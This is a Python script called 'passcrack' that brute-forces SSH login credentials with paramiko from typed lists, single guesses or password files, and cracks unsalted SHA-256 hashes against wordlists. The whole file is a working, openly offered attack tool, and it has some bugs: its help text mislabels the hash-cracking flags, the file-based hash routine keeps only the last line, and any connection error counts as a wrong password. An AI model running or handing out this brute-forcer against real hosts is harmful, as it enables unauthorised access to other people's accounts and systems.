import paramiko
import hashlib

print("Welcome to passcrack! Passcrack is a software used to brute-force ssh login credentials. ")
print("Below are flags for each main service:\n -a: Plaintext password cracking using a list of passwords")
print(" -b: Plaintext password cracking using a specific password")
print(" -c: Plaintext password cracking using a file of passwords")
print(" -d: Password Cracking with various details")
print("A command should look like this:\n   passcrack -b ssh")
command = input("Enter a command: ")

# Defines the ssh client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

# This function uses a list to see which password is correct
def list_pass_plain(target_service):
    host = input("Hostname: ")
    user = input("Username: ")
    print("The list must be in this format:\n   123 456 789")
    guess_list = input("Password list: ")
    i = 0
    lst_ = []
    for x in guess_list.split(" "):
        lst_.append(x)
    while i < len(lst_):
        # Attempts establishing a connection with the target system
        try:
            target_service.connect(hostname=host, username=user, password=lst_[i])
            print(f"Username & Password Found\nUsername: '{user}'\nPassword: '{lst_[i]}' ")
            break
        except:
            print("...")
            i += 1
            if i == len(lst_):
                print("Password not found.")

# This function uses a specific password to see if it is correct or not
def single_pass_plain(target_service):
    hostname = input("Hostname: ")
    username = input("Username: ")
    guess_pass = input("Password: ")

    if type(guess_pass) == str:
        # Attempts establishing a connection with the target system
        try:
            target_service.connect(hostname=hostname, username=username, password=guess_pass)
            print(f"Username & Password Found\nUsername: '{username}'\nPassword: '{guess_pass}' ")
        except:
            print("Incorrect Password ")
    else:
        print()

# This function uses a file of passwords to see if any of them are correct or not
def file_pass_plain(target_service):
    host = input("Hostname: ")
    user = input("Username: ")
    guess_file = input("Password File: ")
    i = 0
    lst_ = []
    
    # Ensures the file is valid
    try:
        with open(guess_file, "r") as file_:
            # Read the file line by line, strip any leading/trailing whitespace and append to lst_
            for lst in file_.readlines():
                lst_.append(lst.strip())  # Add each password to the list
        
        while i < len(lst_):
            try:
                target_service.connect(hostname=host, username=user, password=lst_[i])
                print(f"Username & Password Found\nUsername: '{user}'\nPassword: '{lst_[i]}'")
                break
            except:
                print("...")
                i += 1
                if i == len(lst_):
                    print("Password Not Found")
    except FileNotFoundError:
        print("File Not Found")

def list_hash_cracking():
    print("The list must be in this format:\n   123 456 789")
    plain_pass = input("Password list: ")
    hash_pass = input("Hashed Password: ")
    plain_lst = []
    sha256_= 0
    x = 0
    for i in plain_pass.split(" "):
        plain_lst.append(i)
    while x < len(plain_lst):
        sha256_obj = hashlib.sha256(plain_lst[x].encode())
        sha256_ = sha256_obj.hexdigest()
        if sha256_ == hash_pass:
            print(f"Hash --> Plaintext\n'{hash_pass}' --> '{plain_lst[x]}'")
            break
        else:
            print("...")
            x += 1
            if x == len(plain_lst):
                print("Password Not Found")

def file_hash_cracking():
    file = input("Password File: ")
    hash_ = input("Hashed Password: ")
    sha256 = 0
    y = 0
    try:
        with open(file, "r") as file:
            for lst in file.readlines():
                lst = str(lst).split(" ")
            while y < len(lst):
                sha256_obj = hashlib.sha256(lst[y].encode())
                sha256 = sha256_obj.hexdigest()
                if sha256 == hash_:
                    print(f"Hash --> Plaintext\n'{sha256}' --> '{lst[y]}'")
                    break
                else:
                    print("...")
                    y += 1
                    if y == len(lst):
                        print("Password Not Found")
    except FileNotFoundError:
        print("File Not Found")

# Checks the commands are valid and redirects users to the functions above
if "passcrack" in command:
    # Checks for valid options
    if "-a" in command:
        # Plaintext password cracking uses ssh because the brute forcing is done through the internet
        list_pass_plain(target_service=ssh)
    elif "-b" in command:
        single_pass_plain(target_service=ssh)
    elif "-c" in command:
        file_pass_plain(target_service=ssh)
    # Hash cracking doesn't have anything to do with a specific service because it is done offline
    elif "-d" in command:
        list_hash_cracking()
    elif "-e" in command:
        file_hash_cracking()
    else:
        print("Must specify options")
else:
    print("Invalid command")
